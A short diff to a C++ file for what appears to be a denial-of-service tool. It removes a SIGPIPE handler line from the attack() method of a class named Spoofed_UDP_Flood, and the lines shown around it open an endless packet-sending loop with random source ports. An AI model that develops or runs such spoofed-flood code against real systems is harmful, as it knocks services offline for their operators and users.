@@ -23,7 +23,6 @@ void Spoofed_UDP_Flood::attack(const int *id) {
     struct hostent *hp;
     struct sockaddr_in dst{};
     auto s_port = Randomizer::randomInt(0, 65535);
-    signal(SIGPIPE, &Spoofed_UDP_Flood::broke);
     while (true){
         for(int x = 0; x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
